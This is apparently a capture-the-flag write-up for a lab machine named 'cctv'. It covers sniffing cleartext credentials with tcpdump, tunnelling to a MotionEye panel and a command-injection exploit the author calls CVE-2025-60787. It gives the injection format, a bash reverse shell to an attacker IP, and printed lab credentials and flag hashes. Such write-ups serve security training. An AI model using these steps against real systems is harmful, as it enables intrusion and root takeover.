## Mark user
#### Credentials
```Bash
sshpass -p 'opensesame' ssh mark@cctv.htb
```
#### Port Scan
```Shell
sshpass -p 'opensesame' ssh mark@cctv.htb -T 'ss -nltp'  
State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess
LISTEN 0      4096       127.0.0.1:1935       0.0.0.0:*          
LISTEN 0      4096       127.0.0.1:7999       0.0.0.0:*          
LISTEN 0      151        127.0.0.1:3306       0.0.0.0:*          
LISTEN 0      4096   127.0.0.53%lo:53         0.0.0.0:*          
LISTEN 0      4096         0.0.0.0:22         0.0.0.0:*          
LISTEN 0      4096      127.0.0.54:53         0.0.0.0:*          
LISTEN 0      4096       127.0.0.1:9081       0.0.0.0:*          
LISTEN 0      4096       127.0.0.1:8888       0.0.0.0:*          
LISTEN 0      128        127.0.0.1:8765       0.0.0.0:*          
LISTEN 0      4096       127.0.0.1:8554       0.0.0.0:*          
LISTEN 0      70         127.0.0.1:33060      0.0.0.0:*          
LISTEN 0      4096            [::]:22            [::]:*          
LISTEN 0      511                *:80               *:* 
```
We can see that it has multiple interfaces executing the command `ip a` which means that it has multiple containers but we don' t have permissions to execute docker commands.

After a while checking the incoming traffic and excluding the ARP, IPv6, DNS packets and more noisy traffic I've found an app that is sending an user and a password
```Shell
mark@cctv:~$ tcpdump -i any -nn -A 'tcp port not 22 and port not 8554 and port not 53 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0) and not arp'
tcpdump: data link type LINUX_SLL2
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes
23:58:56.477043 veth45d2a2b P   IP 172.25.0.11.34676 > 172.25.0.10.5000: Flags [P.], seq 2890975662:2890975713, ack 3729737651, win 502, options [nop,nop,TS val 3430258859 ecr 1223817058], length 51
E..g..@.@.$B.......
.t...P...OG.....X......
.u..H..bUSERNAME=sa_mark;PASSWORD=X1l9fx1ZjS7RZb;CMD=status
```
With these creds we got the access to the user flag
```Shell
➜ sshpass -p 'X1l9fx1ZjS7RZb' ssh sa_mark@cctv.htb -T 'cat user.txt'  
03331180566378bfdd5f95eb70a39db9
```
### Root Flag
We see that there is a PDF on the `sa_mark` folder. From this we can get that there will be a new app and the creds will be the same.
![[pdf_info.png]]

checking all the ports I can see that there is a webpage on the port `8765`
```Shell
for i in $(ss -nltp | awk 'NR>1 {print $4}');do echo -e "\n===== Testing $i =====\n"; curl $i;done   
```

Creating a tunnel we are able to find a **_MontionEye_** web page. 
```Shell
sshpass -p 'X1l9fx1ZjS7RZb' ssh sa_mark@cctv.htb -L 8765:127.0.0.1:8765 -N
```
Using the credentials `Username: admin -> Password: X1l9fx1ZjS7RZb` we can access the page.
![[motioneye_login.png]]
#### CVE-2025-60787
We have found this RCE that via adding on the console of the browser the lane
```txt
configUiValid = function() { return true; };
```
on _Still Images_ we add the command with the format `$(command).%Y-%m-%d-%H-%M-%S` we have the exploit ready, we just need to click the button of add screenshot and we will execute a command.
![[debug_console.png]]
![[cam_inject.png]]
![[cam_inject_execute.png]]
and the command has run
```Shell
➜ tcpdump -i tun0 -n icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
13:25:57.779644 IP 10.129.4.247 > 10.10.14.201: ICMP echo request, id 3569, seq 1, length 64
13:25:57.779663 IP 10.10.14.201 > 10.129.4.247: ICMP echo reply, id 3569, seq 1, length 64
```
with this, we can now start our reverse shell
```txt
$(/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.201/1234 0>&1' ).%Y-%m-%d-%H-%M-%S
```

```Shell
➜ nc -lvnp 1234
Listening on 0.0.0.0 1234
Connection received on 10.129.4.247 58980
bash: cannot set terminal process group (4022): Inappropriate ioctl for device
bash: no job control in this shell
root@cctv:/etc/motioneye#
```

now we can read the Root lfag
```Shell
root@cctv:/etc/motioneye# cd /root
root@cctv:~# cat root.txt 
ba1db9871bc7126b49382d0ced2b60f1
```
